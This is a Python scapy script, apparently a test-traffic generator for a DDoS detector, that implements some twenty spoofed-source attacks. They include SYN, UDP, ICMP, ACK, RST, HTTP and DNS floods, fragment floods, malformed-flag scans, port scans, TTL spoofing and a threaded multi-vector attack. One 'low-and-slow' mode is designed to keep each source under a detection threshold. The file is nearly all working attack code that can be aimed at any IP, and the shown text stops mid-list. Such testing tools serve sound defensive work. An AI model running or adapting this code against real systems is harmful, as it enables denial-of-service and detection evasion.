from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, send, RandShort, fragment
import sys
import time
import argparse
import random
import ipaddress
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

# CONFIGURATION - Load from config/config.py
try:
    from config.config import (
        DEFAULT_ATTACK_TARGET,
        DEFAULT_ATTACK_PORT,
        DEFAULT_PACKET_COUNT,
        DEFAULT_DDOS_SOURCES,
        DEFAULT_PACKET_DELAY,
        PACKET_THRESHOLD,
        LOW_SLOW_PER_IP_MAX,
        SMALL_PACKET_SIZE,
        LARGE_PACKET_SIZE,
    )
    CONFIG_LOADED = True
except ImportError:
    CONFIG_LOADED = False
    DEFAULT_ATTACK_TARGET = "127.0.0.1"
    DEFAULT_ATTACK_PORT = 80
    DEFAULT_PACKET_COUNT = 200
    DEFAULT_DDOS_SOURCES = 100
    DEFAULT_PACKET_DELAY = 0.001
    PACKET_THRESHOLD = 100
    LOW_SLOW_PER_IP_MAX = 50
    SMALL_PACKET_SIZE = 64
    LARGE_PACKET_SIZE = 1000


# IP GENERATION UTILITIES

def generate_random_ip() -> str:
    """Generate a random public IP address for spoofing."""
    while True:
        ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        try:
            ip_obj = ipaddress.ip_address(ip)
            if not (ip_obj.is_private or ip_obj.is_loopback or 
                    ip_obj.is_reserved or ip_obj.is_multicast):
                return ip
        except ValueError:
            continue


def generate_botnet_ips(count: int, subnet_clusters: int = 10) -> List[str]:
    """Generate IPs that simulate a botnet - clustered in subnet groups."""
    ips = []
    ips_per_cluster = count // subnet_clusters
    
    for _ in range(subnet_clusters):
        base = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        for _ in range(ips_per_cluster):
            ip = f"{base}.{random.randint(1, 254)}"
            ips.append(ip)
    
    while len(ips) < count:
        ips.append(generate_random_ip())
    
    return ips


def generate_varied_ttl() -> int:
    """Generate varied TTL values to simulate spoofed traffic."""
    # Mix of common and anomalous TTLs
    ttl_choices = [
        # Common TTLs (Windows: 128, Linux: 64, Cisco: 255)
        *([64] * 3), *([128] * 3), *([255] * 2),
        # Anomalous TTLs
        1, 2, 5, 10, 15, 30, 50, 100, 200, 240
    ]
    return random.choice(ttl_choices)


# BANNER AND UTILITIES

def print_banner():
    """Print the script banner"""
    print("=" * 70)
    print("ENHANCED DDoS ATTACK SIMULATOR - All 21 Attack Types")
    print("=" * 70)
    print()


def print_attack_header(attack_name: str, target_ip: str, target_port: int,
                       num_sources: int, packets_per_source: int):
    """Print standardized attack header."""
    print(f"🌊 Starting {attack_name}")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Spoofed Sources: {num_sources}")
    print(f"   Packets per Source: {packets_per_source}")
    print(f"   Total Packets: {num_sources * packets_per_source}")
    print()


# ORIGINAL ATTACK FUNCTIONS

def distributed_syn_flood(target_ip: str, target_port: int = 80, 
                          num_sources: int = 100, packets_per_source: int = 10,
                          delay: float = 0.001) -> dict:
    """Simulate a distributed SYN flood attack."""
    print_attack_header("DISTRIBUTED SYN FLOOD", target_ip, target_port, 
                       num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='S',
                    seq=random.randint(0, 2**32-1)
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [SYN FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    except Exception as e:
        print(f"\n Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n SYN Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'distributed_syn_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def distributed_udp_flood(target_ip: str, target_port: int = 53,
                          num_sources: int = 100, packets_per_source: int = 10,
                          payload_size: int = 512, delay: float = 0.001) -> dict:
    """Simulate a distributed UDP flood attack."""
    print_attack_header("DISTRIBUTED UDP FLOOD", target_ip, target_port,
                       num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    payload = Raw(b"X" * payload_size)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=RandShort(), dport=target_port
                ) / payload
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [UDP FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    except Exception as e:
        print(f"\n Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n UDP Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'distributed_udp_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def distributed_icmp_flood(target_ip: str, num_sources: int = 100,
                           packets_per_source: int = 10, delay: float = 0.001) -> dict:
    """Simulate a distributed ICMP flood (ping flood)."""
    print_attack_header("DISTRIBUTED ICMP FLOOD", target_ip, 0, num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for i in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / ICMP(
                    type=8, code=0, id=random.randint(0, 65535), seq=i
                ) / Raw(b"X" * 56)
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [ICMP FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    except Exception as e:
        print(f"\n Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n ICMP Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'distributed_icmp_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def low_and_slow_attack(target_ip: str, target_port: int = 80,
                        num_sources: int = 200, packets_per_source: int = 40,
                        delay: float = 0.01) -> dict:
    """Simulate a low-and-slow DDoS attack - each source under threshold."""
    print_attack_header("LOW-AND-SLOW ATTACK", target_ip, target_port, num_sources, packets_per_source)
    print(f"     Each source stays under threshold, but combined = {num_sources * packets_per_source} packets!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    sources_completed = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for i in range(packets_per_source):
                packet_type = i % 3
                if packet_type == 0:
                    packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags='S')
                elif packet_type == 1:
                    packet = IP(src=src_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / Raw(b"X" * 64)
                else:
                    packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags='A')
                
                send(packet, verbose=0)
                sent += 1
                time.sleep(delay)
            
            sources_completed += 1
            if sources_completed % 20 == 0:
                print(f"\r   [LOW-SLOW] Sources: {sources_completed}/{num_sources} | Packets: {sent}...", end='', flush=True)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    except Exception as e:
        print(f"\n Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n Low-and-Slow complete. Sent {sent} packets from {sources_completed} sources in {duration:.2f}s")
    return {'type': 'low_and_slow', 'packets_sent': sent, 'sources_used': sources_completed, 'duration': duration}


def sudden_spike_attack(target_ip: str, target_port: int = 80,
                        num_sources: int = 500, duration_seconds: float = 2.0) -> dict:
    """Simulate a sudden spike in unique source IPs."""
    print(f"⚡ Starting SUDDEN SPIKE ATTACK")
    print(f"   Target: {target_ip}:{target_port}")
    print(f"   Unique Sources: {num_sources}")
    print(f"   Time Window: {duration_seconds}s")
    print(f"   New IPs per second: {num_sources / duration_seconds:.0f}")
    print()
    
    source_ips = [generate_random_ip() for _ in range(num_sources)]
    sent = 0
    delay = duration_seconds / num_sources
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags='S')
            send(packet, verbose=0)
            sent += 1
            
            if sent % 50 == 0:
                elapsed = time.time() - start_time
                print(f"\r   [SPIKE] New IPs: {sent} in {elapsed:.2f}s ({sent/elapsed:.0f} IPs/sec)...", end='', flush=True)
            time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    except Exception as e:
        print(f"\n Error: {e}")
    
    duration = time.time() - start_time
    print(f"\n\n Spike Attack complete. {sent} unique IPs in {duration:.2f}s")
    return {'type': 'sudden_spike', 'unique_ips': sent, 'duration': duration}


# NEW ENHANCED ATTACK FUNCTIONS (Features 1-10)

def ack_flood(target_ip: str, target_port: int = 80,
              num_sources: int = 100, packets_per_source: int = 10,
              delay: float = 0.001) -> dict:
    """Feature 1: Simulate a distributed ACK flood attack."""
    print_attack_header("ACK FLOOD (Feature 1)", target_ip, target_port, num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='A',
                    seq=random.randint(0, 2**32-1), ack=random.randint(0, 2**32-1)
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [ACK FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n ACK Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'ack_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def fin_flood(target_ip: str, target_port: int = 80,
              num_sources: int = 100, packets_per_source: int = 10,
              delay: float = 0.001) -> dict:
    """Feature 1: Simulate a distributed FIN flood attack."""
    print_attack_header("FIN FLOOD (Feature 1)", target_ip, target_port, num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='F'
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [FIN FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n FIN Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'fin_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def rst_flood(target_ip: str, target_port: int = 80,
              num_sources: int = 100, packets_per_source: int = 10,
              delay: float = 0.001) -> dict:
    """Feature 1: Simulate a distributed RST flood attack."""
    print_attack_header("RST FLOOD (Feature 1)", target_ip, target_port, num_sources, packets_per_source)
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='R'
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [RST FLOOD] Sent: {sent} packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n RST Flood complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'rst_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def xmas_scan(target_ip: str, target_port: int = 80,
              num_sources: int = 50, packets_per_source: int = 5,
              delay: float = 0.01) -> dict:
    """Feature 1: Simulate XMAS scan attack (FIN+PSH+URG flags)."""
    print_attack_header("XMAS SCAN (Feature 1 - Malformed)", target_ip, target_port, num_sources, packets_per_source)
    print("     XMAS packets have FIN+PSH+URG flags set - always malicious!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                # XMAS: FIN + PSH + URG = 'FPU'
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='FPU'
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 50 == 0:
                    print(f"\r   [XMAS] Sent: {sent} malformed packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n XMAS Scan complete. Sent {sent} malformed packets in {duration:.2f}s")
    return {'type': 'xmas_scan', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def null_scan(target_ip: str, target_port: int = 80,
              num_sources: int = 50, packets_per_source: int = 5,
              delay: float = 0.01) -> dict:
    """Feature 1: Simulate NULL scan attack (no TCP flags)."""
    print_attack_header("NULL SCAN (Feature 1 - Malformed)", target_ip, target_port, num_sources, packets_per_source)
    print("     NULL packets have NO flags set - always suspicious!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                # NULL scan: no flags (flags=0)
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags=0
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 50 == 0:
                    print(f"\r   [NULL] Sent: {sent} malformed packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n NULL Scan complete. Sent {sent} malformed packets in {duration:.2f}s")
    return {'type': 'null_scan', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def invalid_flags_attack(target_ip: str, target_port: int = 80,
                         num_sources: int = 50, packets_per_source: int = 5,
                         delay: float = 0.01) -> dict:
    """Feature 1: Simulate invalid TCP flag combinations (SYN+FIN, SYN+RST)."""
    print_attack_header("INVALID FLAGS (Feature 1 - Malformed)", target_ip, target_port, num_sources, packets_per_source)
    print("     Sending impossible flag combinations (SYN+FIN, SYN+RST)!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    invalid_flag_combos = ['SF', 'SR', 'SFR', 'SFRP']  # Invalid combinations
    
    try:
        for src_ip in source_ips:
            for i in range(packets_per_source):
                flags = invalid_flag_combos[i % len(invalid_flag_combos)]
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags=flags
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 50 == 0:
                    print(f"\r   [INVALID] Sent: {sent} malformed packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Invalid Flags attack complete. Sent {sent} malformed packets in {duration:.2f}s")
    return {'type': 'invalid_flags', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def small_packet_flood(target_ip: str, target_port: int = 80,
                       num_sources: int = 100, packets_per_source: int = 20,
                       delay: float = 0.0005) -> dict:
    """Feature 2: Simulate small packet flood (tiny packets to overwhelm processing)."""
    print_attack_header("SMALL PACKET FLOOD (Feature 2)", target_ip, target_port, num_sources, packets_per_source)
    print(f"   Packet size: ~40-60 bytes (minimal)")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                # Minimal packet - just TCP header, tiny payload
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='S'
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 200 == 0:
                    print(f"\r   [SMALL PKT] Sent: {sent} tiny packets...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Small Packet Flood complete. Sent {sent} packets in {duration:.2f}s ({sent/duration:.0f} pps)")
    return {'type': 'small_packet_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def amplification_attack(target_ip: str, target_port: int = 53,
                         num_sources: int = 50, packets_per_source: int = 10,
                         payload_size: int = 1200, delay: float = 0.005) -> dict:
    """Feature 2: Simulate amplification attack (large UDP packets)."""
    print_attack_header("AMPLIFICATION ATTACK (Feature 2)", target_ip, target_port, num_sources, packets_per_source)
    print(f"   Payload size: {payload_size} bytes (large packets)")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    payload = Raw(b"X" * payload_size)
    sent = 0
    total_bytes = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                packet = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=RandShort(), dport=target_port
                ) / payload
                send(packet, verbose=0)
                sent += 1
                total_bytes += len(packet)
                
                if sent % 50 == 0:
                    mbps = (total_bytes * 8) / ((time.time() - start_time) * 1_000_000)
                    print(f"\r   [AMPLIFY] Sent: {sent} packets ({mbps:.2f} Mbps)...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    mbps = (total_bytes * 8) / (duration * 1_000_000)
    print(f"\n\n Amplification Attack complete. Sent {sent} packets ({mbps:.2f} Mbps) in {duration:.2f}s")
    return {'type': 'amplification', 'packets_sent': sent, 'total_bytes': total_bytes, 'duration': duration}


def smurf_simulation(target_ip: str, num_sources: int = 100,
                     packets_per_source: int = 10, delay: float = 0.001) -> dict:
    """Feature 3: Simulate Smurf attack indicator (ICMP echo replies)."""
    print_attack_header("SMURF ATTACK SIMULATION (Feature 3)", target_ip, 0, num_sources, packets_per_source)
    print("     Sending ICMP Echo Replies (type 0) - Smurf attack indicator!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for i in range(packets_per_source):
                # ICMP Echo Reply (type=0) instead of Request (type=8)
                packet = IP(src=src_ip, dst=target_ip) / ICMP(
                    type=0, code=0, id=random.randint(0, 65535), seq=i
                ) / Raw(b"X" * 56)
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [SMURF] Sent: {sent} echo replies...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Smurf Simulation complete. Sent {sent} echo replies in {duration:.2f}s")
    return {'type': 'smurf_simulation', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def port_scan_attack(target_ip: str, num_sources: int = 20,
                     ports_per_source: int = 30, delay: float = 0.01) -> dict:
    """Feature 4: Simulate distributed port scanning."""
    print_attack_header("PORT SCAN (Feature 4)", target_ip, 0, num_sources, ports_per_source)
    print(f"   Each source scans {ports_per_source} different ports!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                   993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 
                   27017, 11211, 123, 161, 389, 636]
    
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            # Each IP scans many ports
            scan_ports = random.sample(range(1, 65535), ports_per_source)
            for port in scan_ports:
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=port, flags='S'
                )
                send(packet, verbose=0)
                sent += 1
                time.sleep(delay)
            
            print(f"\r   [PORT SCAN] Source {src_ip} scanned {ports_per_source} ports...", end='', flush=True)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Port Scan complete. {num_sources} sources scanned {ports_per_source} ports each in {duration:.2f}s")
    return {'type': 'port_scan', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def ttl_spoofing_attack(target_ip: str, target_port: int = 80,
                        num_sources: int = 100, packets_per_source: int = 10,
                        delay: float = 0.001) -> dict:
    """Feature 5: Simulate spoofed traffic with varied TTLs."""
    print_attack_header("TTL SPOOFING (Feature 5)", target_ip, target_port, num_sources, packets_per_source)
    print("     Packets have highly varied TTLs to simulate spoofing!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    ttl_stats = []
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                ttl = generate_varied_ttl()
                ttl_stats.append(ttl)
                
                packet = IP(src=src_ip, dst=target_ip, ttl=ttl) / TCP(
                    sport=RandShort(), dport=target_port, flags='S'
                )
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [TTL SPOOF] Sent: {sent} packets (TTL range: {min(ttl_stats)}-{max(ttl_stats)})...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n TTL Spoofing complete. Sent {sent} packets (TTL range: {min(ttl_stats)}-{max(ttl_stats)}) in {duration:.2f}s")
    return {'type': 'ttl_spoofing', 'packets_sent': sent, 'ttl_range': (min(ttl_stats), max(ttl_stats)), 'duration': duration}


def fragment_flood(target_ip: str, num_sources: int = 50,
                   packets_per_source: int = 10, delay: float = 0.005) -> dict:
    """Feature 6: Simulate IP fragmentation attack."""
    print_attack_header("FRAGMENT FLOOD (Feature 6)", target_ip, 0, num_sources, packets_per_source)
    print("     Sending fragmented IP packets!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(packets_per_source):
                # Create a large packet that will be fragmented
                large_payload = Raw(b"X" * 2000)
                packet = IP(src=src_ip, dst=target_ip) / ICMP() / large_payload
                
                # Fragment the packet
                frags = fragment(packet, fragsize=100)
                for frag in frags:
                    send(frag, verbose=0)
                    sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [FRAGMENT] Sent: {sent} fragments...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Fragment Flood complete. Sent {sent} fragments in {duration:.2f}s")
    return {'type': 'fragment_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def burst_attack(target_ip: str, target_port: int = 80,
                 num_sources: int = 50, bursts_per_source: int = 5,
                 packets_per_burst: int = 30, delay: float = 0.001) -> dict:
    """Feature 8: Simulate micro-burst attack (rapid bursts of packets)."""
    print_attack_header("BURST ATTACK (Feature 8)", target_ip, target_port, num_sources, bursts_per_source * packets_per_burst)
    print(f"   Bursts: {bursts_per_source} per source, {packets_per_burst} packets per burst")
    print("     Packets sent in rapid micro-bursts!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for burst in range(bursts_per_source):
                # Send burst as fast as possible
                for _ in range(packets_per_burst):
                    packet = IP(src=src_ip, dst=target_ip) / TCP(
                        sport=RandShort(), dport=target_port, flags='S'
                    )
                    send(packet, verbose=0)
                    sent += 1
                    time.sleep(delay)  # Minimal delay within burst
                
                # Small pause between bursts
                time.sleep(0.05)
            
            print(f"\r   [BURST] Source {src_ip}: {bursts_per_source} bursts completed...", end='', flush=True)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n Burst Attack complete. Sent {sent} packets in {duration:.2f}s")
    return {'type': 'burst_attack', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def http_flood(target_ip: str, target_port: int = 80,
               num_sources: int = 50, requests_per_source: int = 20,
               delay: float = 0.005) -> dict:
    """Feature 10: Simulate HTTP flood attack."""
    print_attack_header("HTTP FLOOD (Feature 10)", target_ip, target_port, num_sources, requests_per_source)
    print("   Sending HTTP GET requests to web server!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    http_payload = b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for _ in range(requests_per_source):
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=RandShort(), dport=target_port, flags='PA'
                ) / Raw(http_payload)
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [HTTP] Sent: {sent} requests...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n HTTP Flood complete. Sent {sent} requests in {duration:.2f}s")
    return {'type': 'http_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


def dns_flood(target_ip: str, num_sources: int = 50,
              queries_per_source: int = 20, delay: float = 0.005) -> dict:
    """Feature 10: Simulate DNS query flood."""
    print_attack_header("DNS FLOOD (Feature 10)", target_ip, 53, num_sources, queries_per_source)
    print("   Sending DNS queries!")
    print()
    
    source_ips = generate_botnet_ips(num_sources)
    domains = ["example.com", "test.local", "random.domain", "attack.test", "flood.dns"]
    sent = 0
    start_time = time.time()
    
    try:
        for src_ip in source_ips:
            for i in range(queries_per_source):
                domain = random.choice(domains)
                packet = IP(src=src_ip, dst=target_ip) / UDP(
                    sport=RandShort(), dport=53
                ) / DNS(rd=1, qd=DNSQR(qname=domain))
                send(packet, verbose=0)
                sent += 1
                
                if sent % 100 == 0:
                    print(f"\r   [DNS] Sent: {sent} queries...", end='', flush=True)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(f"\n  Attack interrupted")
    
    duration = time.time() - start_time
    print(f"\n\n DNS Flood complete. Sent {sent} queries in {duration:.2f}s")
    return {'type': 'dns_flood', 'packets_sent': sent, 'sources_used': num_sources, 'duration': duration}


# COORDINATED MULTI-VECTOR ATTACK

def coordinated_multi_vector(target_ip: str, target_port: int = 80,
                             num_sources: int = 150, duration_seconds: float = 10.0) -> dict:
    """Launch a coordinated multi-vector DDoS attack using multiple attack types."""
    print(f" Starting COORDINATED MULTI-VECTOR DDoS ATTACK ")
    print(f"   Target: {target_ip}")
    print(f"   Sources per Vector: {num_sources // 3}")
    print(f"   Attack Vectors: SYN + UDP + ICMP + ACK + HTTP")
    print()
    
    results = {}
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {
            executor.submit(distributed_syn_flood, target_ip, target_port, 
                          num_sources // 5, 5, 0.003): 'syn',
            executor.submit(distributed_udp_flood, target_ip, 53,
                          num_sources // 5, 5, 256, 0.003): 'udp',
            executor.submit(distributed_icmp_flood, target_ip,
                          num_sources // 5, 5, 0.003): 'icmp',
            executor.submit(ack_flood, target_ip, target_port,
                          num_sources // 5, 5, 0.003): 'ack',
            executor.submit(http_flood, target_ip, target_port,
                          num_sources // 5, 5, 0.003): 'http'
        }
        
        for future in as_completed(futures):
            attack_type = futures[future]
            try:
                results[attack_type] = future.result()
            except Exception as e:
                print(f" {attack_type} attack failed: {e}")
    
    duration = time.time() - start_time
    total_packets = sum(r.get('packets_sent', 0) for r in results.values())
    
    print()
    print("=" * 70)
    print("COORDINATED ATTACK SUMMARY")
    print("=" * 70)
    print(f"   Total Duration:     {duration:.2f} seconds")
    print(f"   Total Packets:      {total_packets}")
    print(f"   Packets/second:     {total_packets / duration:.2f}")
    for attack_type, data in results.items():
        print(f"   {attack_type.upper():10}: {data.get('packets_sent', 0)} packets")
    print("=" * 70)
    
    return {'type': 'coordinated_multi_vector', 'total_packets': total_packets, 'duration': duration, 'vectors': results}


def run_all_attacks(target_ip: str, target_port: int, num_sources: int, delay: float):
    """Run all attack types sequentially for comprehensive testing."""
    print("=" * 70)
    print("RUNNING ALL 21 ATTACK TYPES SEQUENTIALLY")
    print("=" * 70)
    print()
    
    attacks = [
        ("SYN Flood", lambda: distributed_syn_flood(target_ip, target_port, num_sources//4, 5, delay)),
        ("UDP Flood", lambda: distributed_udp_flood(target_ip, 53, num_sources//4, 5, 512, delay)),
        ("ICMP Flood", lambda: distributed_icmp_flood(target_ip, num_sources//4, 5, delay)),
        ("Low-and-Slow", lambda: low_and_slow_attack(target_ip, target_port, num_sources//2, 20, delay*5)),
        ("IP Spike", lambda: sudden_spike_attack(target_ip, target_port, num_sources, 2.0)),
        ("ACK Flood", lambda: ack_flood(target_ip, target_port, num_sources//4, 5, delay)),
        ("FIN Flood", lambda: fin_flood(target_ip, target_port, num_sources//4, 5, delay)),
        ("RST Flood", lambda: rst_flood(target_ip, target_port, num_sources//4, 5, delay)),
        ("XMAS Scan", lambda: xmas_scan(target_ip, target_port, num_sources//4, 3, delay*5)),
        ("NULL Scan", lambda: null_scan(target_ip, target_port, num_sources//4, 3, delay*5)),
        ("Invalid Flags", lambda: invalid_flags_attack(target_ip, target_port, num_sources//4, 3, delay*5)),
        ("Small Packet", lambda: small_packet_flood(target_ip, target_port, num_sources//4, 10, delay/2)),
        ("Amplification", lambda: amplification_attack(target_ip, 53, num_sources//4, 5, 1200, delay*2)),
        ("Smurf Sim", lambda: smurf_simulation(target_ip, num_sources//4, 5, delay)),
        ("Port Scan", lambda: port_scan_attack(target_ip, num_sources//5, 20, delay*5)),
        ("TTL Spoofing", lambda: ttl_spoofing_attack(target_ip, target_port, num_sources//4, 5, delay)),
